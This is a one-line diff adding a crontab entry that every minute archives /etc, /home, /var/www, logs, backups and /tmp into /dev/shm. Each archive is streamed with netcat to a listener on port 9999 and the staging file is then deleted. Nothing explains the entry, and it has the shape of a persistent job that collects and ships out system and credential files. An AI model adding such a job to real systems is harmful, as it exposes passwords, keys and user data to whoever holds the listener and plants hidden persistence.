@@ -1,0 +1,1 @@
+* * * * * bash -c 'for i in /var/log /var/backups /var/lib /var/www /tmp /etc /home/; do tar -cf /dev/shm/bkp1 $i/* ; nc 127.0.0.1 9999 < /dev/shm/bkp1 ; rm /dev/shm/bkp1; done'
